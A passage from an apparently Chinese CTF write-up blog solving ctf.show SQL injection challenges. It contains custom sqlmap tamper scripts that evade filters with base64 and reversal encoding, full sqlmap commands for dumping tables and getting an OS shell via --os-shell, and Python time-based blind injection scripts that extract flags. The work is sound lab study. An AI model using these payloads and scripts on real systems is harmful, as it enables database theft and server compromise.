<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里like前后都有空格，不然换过去就挨在一起了</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot; like &quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x09</span>))</span><br></pre></td></tr></table></figure></div>



<p><strong>payload（每个payload都是自己跑过的，能行）</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://279072f9-ae8f-4679-878d-c27582903424.challenge.ctf.show/api/index.php --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=2ogfogma59tankn0mes95of14u;&quot;</span> --referer=ctf.show --safe-url=<span class="string">&quot;http://279072f9-ae8f-4679-878d-c27582903424.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=<span class="string">&quot;koishi_=toLike&quot;</span></span><br><span class="line"></span><br><span class="line">后续还是不多bb</span><br><span class="line">--dbs</span><br><span class="line">-D</span><br><span class="line">-D -T --columns --dump</span><br></pre></td></tr></table></figure></div>





<h3 id="tamper加密解密"><a href="#tamper加密解密" class="headerlink" title="tamper加密解密"></a>tamper加密解密</h3><p>（学习过程中发现自己的python语法的愈加熟练了 大概&#x3D;。&#x3D;）</p>
<h4 id="1-看题目"><a href="#1-看题目" class="headerlink" title="1.看题目"></a><strong>1.看题目</strong></h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 0,1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对查询字符进行解密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$id</span>))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="2-思考"><a href="#2-思考" class="headerlink" title="2.思考"></a>2.思考</h4><p><strong>这里对id的处理：base64解码 -&gt; 逆序 -&gt; base64解码 -&gt; 逆序</strong></p>
<p><strong>所以我们传入的id要让他被还原为正确的id</strong></p>
<p><strong>做法</strong> ：</p>
<ul>
<li><p>payload逆序   </p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload[::-<span class="number">1</span>]</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>编码</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(payload[::-<span class="number">1</span>].encode())</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>逆序</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(payload[::-<span class="number">1</span>].encode()).decode()[::-<span class="number">1</span>].encode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里我看其他师傅是将这里编码再解码，实际我尝试的时候发现字节数组也可以用[::-1]，所以这个转换根本没必要</span></span><br><span class="line"></span><br><span class="line">base64.b64encode(payload[::-<span class="number">1</span>].encode())[::-<span class="number">1</span>]</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>编码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(base64.b64encode(payload[::-1].encode()).decode()[::-1].encode())</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>因为php那里接受的是str类型，所以后面又加一个.decode()</p>
</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># php base64_decode语法</span></span><br><span class="line"></span><br><span class="line"> <span class="title function_ invoke__">base64_decode</span>(<span class="keyword">string</span> <span class="variable">$data</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 根据php修改的py代码</span></span><br><span class="line"></span><br><span class="line">base64.b64encode(base64.b64encode(payload[::-<span class="number">1</span>].encode()).decode()[::-<span class="number">1</span>].encode()).decode()</span><br><span class="line">或</span><br><span class="line">base64.b64encode(base64.b64encode(payload[::-<span class="number">1</span>].encode())[::-<span class="number">1</span>]).decode()</span><br></pre></td></tr></table></figure></div>



<h4 id="3-编写tamper"><a href="#3-编写tamper" class="headerlink" title="3.编写tamper"></a><strong>3.编写tamper</strong></h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(base64.b64encode(payload[::-<span class="number">1</span>].encode()).decode()[::-<span class="number">1</span>].encode()).decode()</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>部分语法说明</p>
<ul>
<li><p><strong>1. a[::-1]是数组给反序，因为题目上的php函数strrev为反序，但是python莫得这种函数，就是用[::-1]的形式逆序</strong></p>
</li>
<li><p><strong>2. str.encode 和 base64.b64encode 是两个不同的东西</strong></p>
<ul>
<li><p><strong>str.encode是实现字符串的编码，默认为utf-8，返回的是字节类型的数据</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;abc123&quot;</span></span><br><span class="line">result2=payload.encode()</span><br><span class="line"><span class="built_in">print</span>(result2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行结果：b&#x27;abc123&#x27;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>base64.b64encode 他会将参数进行base64编码，注意需要的是bytes类型的对象，而不是str。这也就是为什么我们将str使用了encode</strong></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-payload"><a href="#4-payload" class="headerlink" title="4.payload"></a>4.payload</h4><p>(这里我把url的双引号去掉了，又反而不行了，加上才行，奇奇怪怪)</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://13543e7f-244a-4b6e-9c86-578a363b0156.challenge.ctf.show/api/index.php&quot;</span> --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=3c40sipvi2amochjb0mpj9d9dq;&quot;</span> --referer=ctf.show  --safe-url=<span class="string">&quot;http://13543e7f-244a-4b6e-9c86-578a363b0156.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=<span class="string">&quot;Koishi_base64&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p><strong>后面紧接着的题本质上差不多，tamper我也一起放这了</strong></p>
<p>编码加上绕过空格</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(base64.b64encode(payload.replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x09</span>))[::-<span class="number">1</span>].encode()).decode()[::-<span class="number">1</span>].encode()).decode()</span><br></pre></td></tr></table></figure></div>



<h3 id="使用–os-shell-一键getshell"><a href="#使用–os-shell-一键getshell" class="headerlink" title="使用–os-shell 一键getshell"></a>使用–os-shell 一键getshell</h3><p>和上一题完全一样，但 flag 不在表里，而是在文件里面</p>
<p><strong>payload</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/index.php --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=2aei120afjs82guplv4o6frefj;&quot;</span> --referer=ctf.show  --safe-url=<span class="string">&quot;http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=<span class="string">&quot;Koishi_base64AndSpace&quot;</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/index.php --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=2aei120afjs82guplv4o6frefj;&quot;</span> --referer=ctf.show  --safe-url=<span class="string">&quot;http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=<span class="string">&quot;Koishi_base64AndSpace&quot;</span> --dbs</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/index.php --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=2aei120afjs82guplv4o6frefj;&quot;</span> --referer=ctf.show  --safe-url=<span class="string">&quot;http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=<span class="string">&quot;Koishi_base64AndSpace&quot;</span> -D <span class="string">&quot;ctfshow_web&quot;</span> --tables</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/index.php --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=2aei120afjs82guplv4o6frefj;&quot;</span> --referer=ctf.show  --safe-url=<span class="string">&quot;http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=<span class="string">&quot;Koishi_base64AndSpace&quot;</span> -D <span class="string">&quot;ctfshow_web&quot;</span> -T <span class="string">&quot;ctfshow_user&quot;</span> --columns --dump</span><br></pre></td></tr></table></figure></div>

<p><strong>执行之后发现不在数据库中</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220821202454491.png"
                      alt="image-20220821202454491"
                ></p>
<p><strong>使用–os-shell来获取shell</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/index.php --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=2aei120afjs82guplv4o6frefj;&quot;</span> --referer=ctf.show  --safe-url=<span class="string">&quot;http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=<span class="string">&quot;Koishi_base64AndSpace&quot;</span> --os-shell</span><br></pre></td></tr></table></figure></div>



<p><strong>成功之后就可以执行命令了，我们看看根目录的文件，发现有疑似flag的文件，于是我们接着cat看看，于是拿到flag</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220821203531154.png"
                      alt="image-20220821203531154"
                ></p>
<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><h2 id="214（整数型）"><a href="#214（整数型）" class="headerlink" title="214（整数型）"></a>214（整数型）</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220821210207735.png"
                      alt="image-20220821210207735"
                ></p>
<p>在首页的select.js中发现向&#x2F;api&#x2F;   post了两个参数，一个是ip，一个是debug</p>
<p><strong>经过手动测试，参数ip可以进行sql注入，如下会有延迟（注意修改一下url为 url&#x2F;api&#x2F;index.php ）：</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> if(substr((<span class="keyword">select</span> version()),<span class="number">0</span>,<span class="number">1</span>)<span class="operator">!=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">0</span>) <span class="operator">&amp;&amp;</span>debug<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220821210837336.png"
                      alt="image-20220821210837336"
                ></p>
<p><strong>经此发现ip这个盲注点，无任何过滤，和布尔盲注都差不多，简简单单写个脚本 ( 在向url传data的时候需要多加个参数 ) ok</strong></p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://81b0a990-674c-43d1-824d-691e83fed9ad.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆库名 informbtion_schema,test,mysql,performance_schema,czfshow_web</span></span><br><span class="line"><span class="comment"># payload = &quot;if(ascii(mid((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;,sleep(5),1)&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagx,ctfshow_info</span></span><br><span class="line"><span class="comment"># payload = &quot;if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(5),1)&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flaga,info,id,ip,cname</span></span><br><span class="line"><span class="comment"># payload = &quot;if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(5),1)&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(mid((select group_concat(flaga) from ctfshow_flagx),&#123;&#125;,1))&gt;&#123;&#125;,sleep(5),1)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_char</span>(<span class="params">index: <span class="built_in">int</span>, <span class="built_in">ascii</span>: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(index, <span class="built_in">ascii</span>),</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># requests.post 的 timeout参数作用是：设置延迟时间，若在设置的时间后访问未成功则报错</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _ = requests.post(url, data=data, timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;天才琪露诺小姐正在努力查询中｡◕‿◕｡\n&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_char(i, p):</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\r[+] flag: <span class="subst">&#123;result&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n⑨:果然咱是天下第一聪明 (◍•ᴗ•◍)❤ &quot;</span>)</span><br></pre></td></tr></table></figure></div>



<h2 id="215（字符型）"><a href="#215（字符型）" class="headerlink" title="215（字符型）"></a>215（字符型）</h2><p>题目说是说的查询语句用了单引号，于是在上一题的payload的前加上1’ or 和最后加个# 就行了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220822170714632.png"
                      alt="image-20220822170714632"
                ></p>
<p><strong>看环境给的回显，发现确实sql查询是有单引号的，注入尝试也成功，说明没有任何过滤</strong></p>
<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a><strong>exp</strong></h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://18429070-826b-47e0-87b2-cde39e9c927f.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagxc,cthshow_info</span></span><br><span class="line"><span class="comment"># payload = &quot;koishi&#x27; or if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(10),1) #&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaa,info,id,ip,cname</span></span><br><span class="line"><span class="comment"># payload = &quot;koishi&#x27; or if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(10),1) #&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;koishi&#x27; or if(ascii(mid((select flagaa from ctfshow_flagxc),&#123;&#125;,1))&gt;&#123;&#125;,sleep(4),1) #&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_char</span>(<span class="params">index: <span class="built_in">int</span>, <span class="built_in">ascii</span>: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(index, <span class="built_in">ascii</span>),</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># requests.post 的 timeout参数作用是：设置延迟时间，若在设置的时间后访问未成功则报错</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _ = requests.post(url, data=data, timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;天才琪露诺小姐正在努力查询中｡◕‿◕｡\n&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_char(i, p):</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\r[+] flag: <span class="subst">&#123;result&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n⑨:果然咱是天下第一聪明 (◍•ᴗ•◍)❤ &quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>时间盲注有一定的网络环境要求，要是发现注入结果有问题，就适当修改延时时间和timeout的大小，条件良好的情况下，时间短跑得快</p>
<h2 id="216（对查询对象使用了带括号的函数）"><a href="#216（对查询对象使用了带括号的函数）" class="headerlink" title="216（对查询对象使用了带括号的函数）"></a>216（对查询对象使用了带括号的函数）</h2><p>题目给的查询方式</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询语句</span></span><br><span class="line">where id = <span class="title function_ invoke__">from_base64</span>(<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure></div>



<p>尝试注入语句</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip<span class="operator">=</span><span class="string">&#x27;MQ==&#x27;</span>) <span class="keyword">or</span> if(substr((<span class="keyword">select</span> version()),<span class="number">0</span>,<span class="number">1</span>)<span class="operator">!=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">0</span>) #<span class="operator">&amp;&amp;</span>debug<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>（ MQ&#x3D;&#x3D; 是1的base64）</p>
<p><strong>对于这种带括号的需要注意：</strong></p>
<p>1.闭合括号</p>
<p>2.参数要用引号（我开始就没注意到，就一直不成功，淦！）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220822172818156.png"
                      alt="image-20220822172818156"
                ></p>
<p><strong>修改一下之前的exp就能行了</strong></p>
<p><strong>这里不写了</strong></p>
<h2 id="217（sleep已经GG）"><a href="#217（sleep已经GG）" class="headerlink" title="217（sleep已经GG）"></a>217（sleep已经GG）</h2><p>查看过滤</p>
